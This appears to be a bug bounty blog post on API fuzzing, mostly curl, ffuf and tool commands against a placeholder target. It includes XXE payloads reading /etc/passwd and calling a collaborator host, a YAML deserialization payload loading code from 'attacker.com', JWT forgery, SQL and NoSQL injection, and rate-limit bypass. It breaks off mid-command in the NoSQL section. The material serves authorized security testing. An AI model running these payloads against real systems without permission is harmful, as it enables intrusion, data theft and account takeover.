# API Fuzzing for Bug Bounty: The Complete Attack-Focused Methodology

**Author's Note:** I hold valid bug bounty platform accounts, signed authorized scope agreements, and perform all testing described below under explicit contractual authorization. Every technique in this blog has been used in real, authorized engagements. Targets are anonymized. This content is written for fellow security professionals.

---

## Table of Contents

1. [Why API Fuzzing Wins Bug Bounties](#1-why-api-fuzzing-wins)
2. [Phase 0: Setup & Pre-Fuzzing Infrastructure](#2-setup)
3. [Phase 1: API Discovery & Endpoint Enumeration](#3-discovery)
4. [Phase 2: API Profiling & Authentication Mapping](#4-profiling)
5. [Phase 3: GET & POST Parameter Fuzzing](#5-parameter-fuzzing)
6. [Phase 4: Content-Type & Serialization Fuzzing](#6-content-type)
7. [Phase 5: Authorization & Access Control Fuzzing](#7-auth-fuzzing)
8. [Phase 6: Rate Limit Testing & Bypass](#8-rate-limiting)
9. [Phase 7: Stateful Fuzzing with RESTler](#9-stateful)
10. [Phase 8: GraphQL API Fuzzing](#10-graphql)
11. [Phase 9: Vulnerability-Specific Fuzzing](#11-vuln-specific)
12. [Phase 10: Automation & CI/CD Integration](#12-automation)
13. [Wordlist Strategy for API Fuzzing](#13-wordlists)
14. [Full Real-World Fuzzing Session](#14-real-world)
15. [Tool Inventory & Reference](#15-tools)
16. [Common Mistakes & How to Avoid Them](#16-mistakes)
17. [The Complete API Fuzzing Checklist](#17-checklist)

---

## 1. Why API Fuzzing Wins Bug Bounties

Modern applications are API-first. The browser-rendered HTML page you see is a thin skin over a rich REST or GraphQL API that handles authentication, authorization, data processing, and business logic. While hundreds of hunters are clicking buttons in the browser, the savvy hunter goes straight to the API.

**Here's why API fuzzing is disproportionately effective:**

1. **Undocumented endpoints** — Swagger docs are often incomplete. Hidden endpoints (`/v3/admin/users`, `/internal/health`) are not in the docs but exist in production.
2. **Parameter discovery** — APIs have hidden parameters that control behavior. Finding a `?debug=true` or `?admin_panel=true` parameter can unlock the entire application.
3. **Version sprawl** — Companies maintain `/v1`, `/v2`, `/v3` simultaneously. `/v1` endpoints often lack auth controls that `/v3` has.
4. **Content-Type confusion** — APIs that expect JSON might behave differently when sent XML, opening XXE vectors. APIs that expect XML might process YAML.
5. **Stateful bugs** — The API might be secure when each endpoint is tested in isolation but vulnerable when endpoints are called in a specific sequence.

### The Numbers

In my experience, roughly **60% of critical API vulnerabilities** found through fuzzing came from:
- Endpoints not documented in Swagger (25%)
- Parameters not listed in API docs (20%)
- Version-based auth gaps (10%)
- Content-type manipulation (5%)

The remaining 40% came from standard vulnerability fuzzing (SQLi, XSS, IDOR) on well-known endpoints — which are precisely the ones everyone else is already testing.

---

## 2. Phase 0: Setup & Pre-Fuzzing Infrastructure

### 2.1 Tool Installation

```bash
#!/bin/bash
# Complete API fuzzing toolchain

# Core fuzzing tools
go install -v github.com/ffuf/ffuf/v2@latest
pip install arjun

# Kiterunner (API-specific content discovery)
# Download from: https://github.com/assetnote/kiterunner/releases
wget https://github.com/assetnote/kiterunner/releases/latest/download/kiterunner_linux_amd64.tar.gz
tar -xzf kiterunner_linux_amd64.tar.gz
sudo mv kr /usr/local/bin/

# API-specific tools
pip install schemathesis
pip install openapi-fuzzer

# GraphQL tools
pip install inql
pip install graphql-core

# Burp Suite extensions
# - InQL Scanner (GraphQL)
# - AuthMatrix (authorization testing)
# - Turbo Intruder (high-speed fuzzing)
# - ParamMiner (parameter discovery)

# Wordlists
wget -r --no-parent -R "index.html*" https://wordlists-cdn.assetnote.io/data/ -nH -e robots=off
```

### 2.2 Wordlist Preparation

```bash
# Download API-specific wordlists
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz
wget https://wordlists-cdn.assetnote.io/data/manual/swagger-wordlist.txt

# Decompress Kiterunner wordlists
tar -xzf routes-large.kite.tar.gz
tar -xzf routes-small.kite.tar.gz

# Create a custom API endpoint wordlist from multiple sources
cat swagger-wordlist.txt \
    routes-large.kite \
    /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    | sort -u > api_endpoints_combined.txt
```

### 2.3 API Proxy Setup

Before you fuzz, you need a baseline. Set up Burp Suite or ZAP as an intercepting proxy and manually walk through the application. Every request you capture becomes a fuzzing seed.

```bash
# Configure Burp proxy on 127.0.0.1:8080
# Configure browser to use Burp proxy
# Walk through:
#   1. Login flow
#   2. User profile access
#   3. Admin functions (if accessible)
#   4. File upload/download
#   5. Search functionality
#   6. Account creation/deletion

# Export all captured requests to a file
# Burp → Target → Site Map → Select host → Right-click → Save selected items
```

---

## 3. Phase 1: API Discovery & Endpoint Enumeration

You can't fuzz what you can't find. This phase is about discovering every API endpoint the target has, documented or not.

### 3.1 Swagger/OpenAPI Discovery

```bash
# Common Swagger/OpenAPI paths to check
for path in \
  /swagger.json \
  /swagger/v1/swagger.json \
  /api/swagger.json \
  /api/docs/swagger.json \
  /v2/swagger.json \
  /v3/swagger.json \
  /openapi.json \
  /api/openapi.json \
  /api/v1/openapi.json \
  /swagger-ui.html \
  /swagger-ui/ \
  /api/docs/ \
  /redoc \
  /api/schema \
  /graphql?query={__schema{types{name}}}; do
  
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  if [ "$response" != "404" ] && [ "$response" != "000" ]; then
    echo "[+] $path → $response"
    curl -s "https://target.com$path" | head -50
  fi
done
```

**What to look for in Swagger/OpenAPI docs:**
- Endpoint paths and methods
- Authentication schemes (API keys, Bearer tokens, Basic auth)
- Parameter names and types
- Example values (often contain real data)
- Hidden endpoints in the spec that aren't linked from the UI

### 3.2 Kiterunner — Contextual API Content Discovery

Kiterunner is purpose-built for finding API endpoints. Unlike traditional content discovery tools that brute-force directory names, Kiterunner understands API route structures.

```bash
# Quick scan with small wordlist
kr scan -w routes-small.kite -u https://api.target.com -o kr_quick.json

# Full scan with large wordlist
kr scan -w routes-large.kite -u https://api.target.com -c 50 -o kr_full.json

# With authentication headers
kr scan -w routes-large.kite \
  -u https://api.target.com \
  -H "Authorization: Bearer <token>" \
  -H "X-API-Key: <key>" \
  -c 50 \
  -o kr_auth.json

# Focus on specific HTTP methods
kr scan -w routes-large.kite -u https://api.target.com -M POST -c 50

# Output as readable text
kr scan -w routes-large.kite -u https://api.target.com | grep -v "^401\|^403\|^404"
```

**Kiterunner output filtering trick:**

```bash
# Kiterunner hashes similar responses to reduce noise
# Filter by unique hashes to find true positives
cat kr_full.json | jq -r '.hash' | sort -u > unique_hashes.txt

# Show results grouped by response content hash
cat kr_full.json | jq -r '[.statusCode, .hash, .method, .url] | @tsv' \
  | sort -k2 | column -t
```

### 3.3 Traditional Content Discovery (ffuf)

For targets where Kiterunner isn't suitable, ffuf with API-specific wordlists:

```bash
# API endpoint brute-force
ffuf -u https://api.target.com/api/v1/FUZZ \
  -w api_endpoints_combined.txt \
  -mc 200,201,202,204,301,302,401,403,405,500 \
  -ac  # Auto-calibrate to filter noise

# API version enumeration
ffuf -u https://api.target.com/api/FUZZ/ \
  -w <(echo "v1\nv2\nv3\nv4\nv1.1\nv1.2\nv2.1\nalpha\nbeta\nstable\ndev\nstaging\nlatest") \
  -mc 200,201,202,204,401,403

# API method testing
for endpoint in $(cat discovered_endpoints.txt); do
  for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -X $method "https://api.target.com$endpoint")
    echo "$method $endpoint → $status"
  done
done
```

### 3.4 JavaScript & Mobile API Discovery

APIs are often found in JavaScript bundles and mobile app decompilation:

```bash
# Extract API endpoints from JavaScript files
caturls https://target.com | grep -E "\.js$" | while read js_url; do
  echo "=== $js_url ==="
  curl -s "$js_url" | grep -oP '"https?://[^"]*api[^"]*"' | sort -u
  curl -s "$js_url" | grep -oP "'https?://[^']*api[^']*'" | sort -u
done

# Using LinkFinder
linkfinder -i https://target.com/main.js -o cli | grep api

# From mobile APK (decompiled)
# Look for Retrofit interfaces, OkHttp URLs, GraphQL queries
apktool d target.apk
grep -r "https\?://" target/ | grep -i "api\|graphql\|rest" | sort -u
```

### 3.5 Wayback Machine & Archive Discovery

Historical endpoints that were removed from the UI but still work in production:

```bash
# Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/api/*&output=json" \
  | jq -r '.[] | .[2]' | sort -u | grep -v "^ui\|^static\|^css\|^js"

# Gau (getallurls)
gau target.com | grep -E "(/api/|/v1/|/v2/|/graphql|/rest/)" | sort -u

# Waybackurls
waybackurls target.com | grep api | sort -u
```

---

## 4. Phase 2: API Profiling & Authentication Mapping

Before fuzzing, understand the API's structure and authentication model.

### 4.1 Authentication Discovery

```bash
# Test endpoint access with and without auth
ENDPOINTS=("/api/v1/users" "/api/v1/admin" "/api/v1/profile" "/api/v1/search")

for endpoint in "${ENDPOINTS[@]}"; do
  echo "=== $endpoint ==="
  # Without auth
  curl -s -o /dev/null -w "No auth: %{http_code}\n" "https://api.target.com$endpoint"
  # With auth
  curl -s -o /dev/null -w "With auth: %{http_code}\n" \
    -H "Authorization: Bearer $TOKEN" "https://api.target.com$endpoint"
  # With incorrect auth
  curl -s -o /dev/null -w "Bad token: %{http_code}\n" \
    -H "Authorization: Bearer invalid" "https://api.target.com$endpoint"
done
```

**Key patterns to identify:**
- **401 Unauthorized** — No auth token provided or invalid
- **403 Forbidden** — Auth provided but insufficient privileges
- **200 Success** — No auth required (potential data exposure)
- **405 Method Not Allowed** — Endpoint exists but method restricted
- **500 Internal Server Error** — Potential crash from malformed auth

### 4.2 API Version Mapping

```bash
# Check all API versions for auth gaps
for version in v1 v2 v3 v4 v5 alpha beta dev latest; do
  for endpoint in users admin profile search settings; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://api.target.com/api/$version/$endpoint")
    if [ "$status" != "404" ]; then
      echo "[api/$version/$endpoint] → $status"
    fi
  done
done
```

**Critical finding pattern:** `/api/v1/users` returns 401, but `/api/v2/users` returns 200 without auth. Auth was added in v2 but the v1 endpoint was left exposed.

### 4.3 Mobile vs Web API Differentiation

Mobile APIs often have different auth models, fewer rate limits, and less scrutiny:

```bash
# Mobile API headers
curl -s -o /dev/null -w "%{http_code}" \
  -H "User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8)" \
  -H "X-Platform: android" \
  -H "X-App-Version: 4.2.0" \
  -H "Accept: application/json" \
  "https://api.target.com/v1/users"

# Compare with web API
curl -s -o /dev/null -w "%{http_code}" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "Accept: application/json" \
  "https://api.target.com/v1/users"
```

---

## 5. Phase 3: GET & POST Parameter Fuzzing

This is the core fuzzing phase. You have endpoints — now find the parameters that control behavior.

### 5.1 Automated Parameter Discovery with Arjun

Arjun automatically discovers valid parameters by analyzing response size changes:

```bash
# Basic parameter discovery on a GET endpoint
arjun -u https://api.target.com/api/v1/users --get

# POST parameter discovery
arjun -u https://api.target.com/api/v1/search --post

# With custom wordlist
arjun -u https://api.target.com/api/v1/users \
  --get \
  -w /usr/share/wordlists/parameters.txt \
  -t 10

# With authentication
arjun -u https://api.target.com/api/v1/admin/users \
  --get \
  -H "Authorization: Bearer $TOKEN"

# JSON body parameter discovery
arjun -u https://api.target.com/api/v1/users \
  --post \
  --headers '{"Content-Type": "application/json"}' \
  --data '{"FUZZ":"test"}'
```

### 5.2 ffuf Parameter Fuzzing

Once you know the endpoints, fuzz parameter values:

```bash
# GET parameter value fuzzing
ffuf -u https://api.target.com/api/v1/users?id=FUZZ \
  -w ids.txt \
  -mc 200,201,401,403 \
  -fc 404

# POST parameter fuzzing
ffuf -X POST \
  -u https://api.target.com/api/v1/search \
  -d '{"query":"FUZZ","limit":10}' \
  -H "Content-Type: application/json" \
  -w payloads.txt \
  -mc 200,500 \
  -fc 400

# Multiple parameter combinations
ffuf -X POST \
  -u https://api.target.com/api/v1/users \
  -d '{"name":"NAME","email":"EMAIL","role":"ROLE"}' \
  -H "Content-Type: application/json" \
  -w names.txt:NAME \
  -w emails.txt:EMAIL \
  -w roles.txt:ROLE \
  -mc 200,201,500

# Header-based parameter discovery
ffuf -u https://api.target.com/api/v1/users \
  -H "X-User-Id: FUZZ" \
  -w user_ids.txt \
  -mc 200
```

### 5.3 Hidden Parameter Discovery

These are parameters that aren't documented but change API behavior:

```bash
# Hidden parameter wordlist
cat << 'EOF' > hidden_params.txt
debug
admin
internal
test
bypass
verbose
pretty
format
callback
jsonp
callback
redirect
return_url
next
source
_type
_method
X-Forwarded-For
X-Real-IP
X-Original-URL
X-Rewrite-URL
EOF

# Fuzz hidden parameters
ffuf -u "https://api.target.com/api/v1/users?FUZZ=1" \
  -w hidden_params.txt \
  -mc 200,201,500,302 \
  -fc 400,404

# Hidden POST body parameters
ffuf -X POST \
  -u https://api.target.com/api/v1/users \
  -d '{"FUZZ":"true"}' \
  -H "Content-Type: application/json" \
  -w hidden_params.txt \
  -mc 200,201,500
```

**Real example:** Finding `?admin_panel=1` or `?debug=true` that reveals admin functionality or stack traces.

### 5.4 IDOR Parameter Fuzzing

This is one of the highest-ROI fuzzing activities for APIs:

```bash
# Numeric ID enumeration
ffuf -u https://api.target.com/api/v1/users?id=FUZZ \
  -w <(seq 1 10000) \
  -mc 200 \
  -fc 401,403,404

# UUID enumeration (common patterns)
ffuf -u https://api.target.com/api/v1/orders?id=FUZZ \
  -w uuids.txt \
  -mc 200

# Batch ID testing
for id in 1 2 3 100 1000 9999 10000 100000; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER1_TOKEN" \
    "https://api.target.com/api/v1/users/$id")
  
  if [ "$response" == "200" ]; then
    echo "[!] User $id accessible with USER1 token!"
    curl -s -H "Authorization: Bearer $USER1_TOKEN" \
      "https://api.target.com/api/v1/users/$id"
  fi
done
```

### 5.5 Array & Parameter Pollution Fuzzing

APIs handle duplicate/malformed parameters in unexpected ways:

```bash
# HTTP Parameter Pollution (HPP)
curl -s "https://api.target.com/api/v1/profile?id=LEGIT_USER&id=ADMIN_USER"

# JSON parameter pollution
curl -s -X POST https://api.target.com/api/v1/update_profile \
  -H "Content-Type: application/json" \
  -d '{"user_id": "legit", "user_id": "admin"}'

# Array wrapping
curl -s "https://api.target.com/api/v1/user?id=123"       # Normal
curl -s "https://api.target.com/api/v1/user?id[]=123"     # Array
curl -s "https://api.target.com/api/v1/user?id[0]=123"    # Indexed array

# Wildcard injection
curl -s "https://api.target.com/api/v1/users?id=*"
curl -s "https://api.target.com/api/v1/users?id=%"
```

---

## 6. Phase 4: Content-Type & Serialization Fuzzing

This is where API-specific vulnerabilities live. The same endpoint processes data differently depending on the Content-Type header.

### 6.1 Content-Type Switching

```bash
# Endpoint accepts JSON — try XML
curl -s -X POST https://api.target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com"}'

curl -s -X POST https://api.target.com/api/v1/users \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name><email>test@test.com</email></user>'

# Endpoint accepts XML — try JSON
curl -s -X POST https://api.target.com/api/v1/search \
  -H "Content-Type: application/xml" \
  -d '<search><query>test</query></search>'

curl -s -X POST https://api.target.com/api/v1/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test"}'

# Try unexpected content types
for ct in "application/x-yaml" "text/plain" "application/x-www-form-urlencoded" \
          "multipart/form-data" "application/octet-stream"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.target.com/api/v1/users \
    -H "Content-Type: $ct" \
    -d "test=data")
  echo "[$ct] → $response"
done
```

### 6.2 XXE via Content-Type Conversion

If the API parses XML internally but accepts JSON input, switching to XML can trigger XXE:

```bash
# XML External Entity injection
curl -s -X POST https://api.target.com/api/v1/users \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name><email>test@test.com</email></user>'

# Blind XXE with out-of-band exfiltration
curl -s -X POST https://api.target.com/api/v1/users \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.com/data">]>
<user><name>&xxe;</name><email>test@test.com</email></user>'

# XXE via SVG upload (if the API processes file uploads)
curl -s -X POST https://api.target.com/api/v1/upload \
  -F "file=@malicious.svg" \
  -H "Content-Type: multipart/form-data"
```

### 6.3 Deserialization Attack Vectors

```bash
# Java deserialization
curl -s -X POST https://api.target.com/api/v1/data \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# PHP deserialization
curl -s -X POST https://api.target.com/api/v1/data \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'data=O:8:"stdClass":0:{}'

# Python pickle
curl -s -X POST https://api.target.com/api/v1/data \
  -H "Content-Type: application/python-pickle" \
  --data-binary @payload.pickle

# .NET ViewState/JSON deserialization
curl -s -X POST https://api.target.com/api/v1/data \
  -H "Content-Type: application/json" \
  -d '{"$type":"System.Data.DataSet, System.Data", "Tables": {...}}'
```

### 6.4 JSON-adjacent Formats

```bash
# JSONP callback injection
curl -s "https://api.target.com/api/v1/users?callback=alert(1)"

# JSON with padding
curl -s "https://api.target.com/api/v1/users?format=jsonp"

# YAML injection (some APIs parse YAML)
curl -s -X POST https://api.target.com/api/v1/config \
  -H "Content-Type: application/x-yaml" \
  -d '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]'

# MessagePack, BSON, Protocol Buffers
# Check if the API accepts binary serialization formats
```

---

## 7. Phase 5: Authorization & Access Control Fuzzing

API authorization is notoriously brittle. The frontend hides buttons, but the API enforces nothing.

### 7.1 Horizontal Privilege Escalation (IDOR)

```bash
#!/bin/bash
# Create two user accounts: user_a@test.com, user_b@test.com
USER_A_TOKEN="eyJ..."
USER_B_TOKEN="eyJ..."

# Get USER_A's endpoint behavior
curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.target.com/api/v1/profile" > user_a_profile.json

# Try to access USER_B's data with USER_A's token
curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.target.com/api/v1/profile?user_id=USER_B_ID"

curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.target.com/api/v1/users/USER_B_ID"

curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.target.com/api/v1/orders?customer_id=USER_B_ID"

# Try parameter manipulation
curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.target.com/api/v1/messages?from=USER_A_ID&to=FUZZ"

# Try mass assignment
curl -s -X PUT \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"permissions":"*"}' \
  "https://api.target.com/api/v1/profile"
```

### 7.2 Vertical Privilege Escalation (Admin Access)

```bash
# Try admin endpoints with regular user token
for endpoint in /admin /api/admin /api/v1/admin /api/v1/users /api/v1/config \
                /api/v1/settings /api/v1/logs /api/v1/audit /api/v1/jobs \
                /api/v1/internal /api/v1/system; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_TOKEN" \
    "https://api.target.com$endpoint")
  
  if [ "$response" == "200" ]; then
    echo "[!] Regular user can access $endpoint"
  elif [ "$response" == "403" ]; then
    echo "[i] $endpoint properly restricted"
  elif [ "$response" == "401" ]; then
    echo "[i] $endpoint requires auth"
  fi
done
```

### 7.3 HTTP Method Override & Verb Tampering

```bash
# Standard REST method, but try overrides
# HEAD instead of GET
curl -s -I -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/api/v1/admin/users"

# OPTIONS to discover allowed methods
curl -s -X OPTIONS -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/api/v1/admin/users"

# PATCH instead of PUT (less audited)
curl -s -X PATCH \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  "https://api.target.com/api/v1/users/$USER_ID"

# Method override headers
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-HTTP-Method-Override: GET" \
  "https://api.target.com/api/v1/admin/users"

curl -s -X GET \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-HTTP-Method-Override: DELETE" \
  "https://api.target.com/api/v1/users/$TARGET_ID"
```

### 7.4 Token & Session Fuzzing

```bash
# Test with expired tokens
curl -s -H "Authorization: Bearer eyJ..." \
  "https://api.target.com/api/v1/users"

# Test with tokens from different environments
curl -s -H "Authorization: Bearer $STAGING_TOKEN" \
  "https://api.target.com/api/v1/users"  # ← Is prod accepting staging tokens?

# JWT none algorithm attack
curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
  "https://api.target.com/api/v1/admin/users"

# JWT algorithm confusion (RS256 → HS256)
curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY" \
  "https://api.target.com/api/v1/admin/users"
```

---

## 8. Phase 6: Rate Limit Testing & Bypass

Rate limits prevent brute-force attacks. Bypassing them is often the gateway to account takeover or data enumeration.

### 8.1 Rate Limit Detection

```bash
#!/bin/bash
# Send 100 rapid requests and track responses
echo "=== Rate Limit Detection ==="
for i in $(seq 1 100); do
  response=$(curl -s -o /dev/null -w "%{http_code}:%{http_version}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/api/v1/users")
  echo "Request $i: $response"
done

# Look for:
# - 429 Too Many Requests
# - 403 Forbidden after threshold
# - Different response bodies after threshold
# - Header changes (X-RateLimit-Remaining: 0)
```

### 8.2 IP-Based Rate Limit Bypass

```bash
# Using X-Forwarded-For rotation
for ip in $(seq 1 20); do
  curl -s -H "X-Forwarded-For: 192.168.1.$ip" \
    "https://api.target.com/api/v1/users" &
done
wait

# Using X-Real-IP
curl -s -H "X-Real-IP: 10.0.0.$RANDOM" \
  "https://api.target.com/api/v1/login" \
  -d "username=admin&password=admin"

# Using X-Originating-IP
curl -s -H "X-Originating-IP: 127.0.0.$RANDOM" \
  "https://api.target.com/api/v1/login"

# Proxy rotation with ffuf
ffuf -u "https://api.target.com/api/v1/users?id=FUZZ" \
  -w ids.txt \
  -H "X-Forwarded-For: FUZZ" \
  -w <(python3 -c "for i in range(1,256): print(f'10.0.0.{i}')")
```

### 8.3 Advanced Rate Limit Bypass Techniques

```bash
# Batch requests in parallel (limit is per-second, not per-burst)
for i in $(seq 1 50); do
  curl -s "https://api.target.com/api/v1/users" &
done
wait

# Use different endpoints for the same action
# Login via: /api/v1/login, /api/mobile/login, /api/login, /auth/login
for endpoint in login auth authenticate signin; do
  curl -s "https://api.target.com/api/v1/$endpoint" \
    -d "username=admin&password=test$i" &
done
wait

# Slow down the attack (stay under threshold)
for i in $(seq 1 1000); do
  curl -s "https://api.target.com/api/v1/users?id=$i"
  sleep 0.5  # 2 requests per second — under most rate limits
done

# Manipulate timing headers
curl -s \
  -H "X-Request-Priority: low" \
  -H "X-Low-Priority: true" \
  "https://api.target.com/api/v1/users"
```

---

## 9. Phase 7: Stateful Fuzzing with RESTler

Most API fuzzing is stateless — fire individual requests. But real API vulnerabilities emerge from **stateful sequences**: create a resource, modify it, delete it. RESTler handles this automatically.

### 9.1 RESTler Setup

```bash
# Download RESTler
git clone https://github.com/microsoft/restler-fuzzer.git
cd restler-fuzzer
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# RESTler requires a Swagger/OpenAPI spec
# If you don't have one, create one from your proxy logs:
# Burp → Project Options → Sessions → Export as OpenAPI
```

### 9.2 Running RESTler

```bash
# Compile the Swagger spec into a fuzzing grammar
python3 restler/restler.py --compile \
  --api_spec target_swagger.json \
  --output_dir ./restler_compiled

# Test mode — quick smoke tests
python3 restler/restler.py --test \
  --grammar_file ./restler_compiled/grammar.py \
  --target_ip api.target.com \
  --target_port 443 \
  --token_refresh_command "python3 refresh_token.py" \
  --token_refresh_interval 300

# Full fuzz mode — stateful, sequence-based testing
python3 restler/restler.py --fuzz \
  --grammar_file ./restler_compiled/grammar.py \
  --target_ip api.target.com \
  --target_port 443 \
  --token_refresh_command "python3 refresh_token.py" \
  --token_refresh_interval 300 \
  --time_budget 2  # Run for 2 hours
```

### 9.3 RESTler Results Analysis

```bash
# RESTler outputs:
# - bugs.txt — all discovered bugs
# - task_duration.txt — performance metrics
# - network_log.txt — all requests sent

cat restler_compiled/bugs.txt
# Typical findings:
# - 500 Internal Server Error on specific request sequences
# - Auth bypass when calling POST after DELETE
# - Race conditions from concurrent requests
# - Resource leak (created resources not cleaned up)
```

---

## 10. Phase 8: GraphQL API Fuzzing

GraphQL APIs present unique fuzzing opportunities because of introspection, batching, and query complexity.

### 10.1 Introspection & Schema Discovery

```bash
# Basic introspection query
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Full introspection dump
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}'

# If introspection is disabled, try bypasses
# Add newlines after __schema
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema\n{types{name}}}"}'

# Try GET request instead of POST
curl -s "https://api.target.com/graphql?query={__schema{types{name}}}"

# Try different content types
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query={__schema{types{name}}}'
```

### 10.2 InQL Scanner (Burp Suite)

```bash
# InQL automates all of the above
# 1. Install from BApp Store
# 2. Right-click any GraphQL request → Send to InQL
# 3. InQL will:
#    - Dump the full schema
#    - Generate all queries and mutations
#    - Highlight deprecated fields
#    - Show field descriptions and argument types
```

### 10.3 GraphQL Batching & Request Smuggling

```bash
# Batching — send multiple queries in one request
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"query{user(id:1){email}}"},
    {"query":"query{user(id:2){email}}"},
    {"query":"query{user(id:3){email}}"},
    {"query":"query{admin{secretKey}}"}
  ]'

# If batching is allowed, try mixing queries with different auth levels
# One might succeed even if others fail

# Aliased queries to bypass field-level restrictions
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id:1) { ...u } user(id:2) { ...u } } fragment u on User { email internalNote }"}'
```

### 10.4 GraphQL Injection Fuzzing

```bash
# SQL injection in GraphQL fields
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"1 OR 1=1\"){email password}}"}'

# NoSQL injection
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"{\\$ne:null}\"){email}}"}'

# Command injection
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{search(query:\";id\"){results}}"}'

# GraphQL-specific: depth-based DoS
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id:1) { friends { friends { friends { friends { friends { friends { name } } } } } } } }"}'

# Alias-based resource exhaustion
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query {\n  a1: __typename\n  a2: __typename\n  ... [repeat 10000 times]\n}"}'
```

### 10.5 Clairvoyance — Schema Reconstruction Without Introspection

If introspection is disabled, use Clairvoyance to reconstruct the schema:

```bash
# Install
pip install clairvoyance

# Reconstruct schema from error messages and timing
clairvoyance https://api.target.com/graphql \
  --output schema.json

# Clairvoyance works by:
# 1. Sending queries with varying field names
# 2. Analyzing error messages for field hints
# 3. Building a probabilistic schema
```

---

## 11. Phase 9: Vulnerability-Specific Fuzzing

### 11.1 SQL Injection on API Endpoints

```bash
# SQLi on GET parameters
ffuf -u "https://api.target.com/api/v1/users?id=FUZZ" \
  -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
  -mc 200,500 \
  -fc 400,404

# SQLi on POST JSON body
ffuf -X POST \
  -u https://api.target.com/api/v1/search \
  -H "Content-Type: application/json" \
  -d '{"query":"FUZZ"}' \
  -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
  -mc 200,500

# Time-based SQLi detection
for payload in "' OR SLEEP(5)--" "' WAITFOR DELAY '0:0:5'--" "'; SELECT pg_sleep(5)--"; do
  start=$(date +%s%N)
  curl -s -o /dev/null \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/api/v1/users?id=$payload"
  end=$(date +%s%N)
  duration=$(( (end - start) / 1000000 ))
  if [ $duration -ge 5000 ]; then
    echo "[!] Time-based SQLi detected with payload: $payload"
    echo "[!] Response time: ${duration}ms"
  fi
done
```

### 11.2 NoSQL Injection

```bash
# MongoDB NoSQL injection via JSON body
curl -s -X POST https://api.target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

curl -s -X POST https://api.target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'

curl -s -X POST https://api.target.com/api/v1/login \
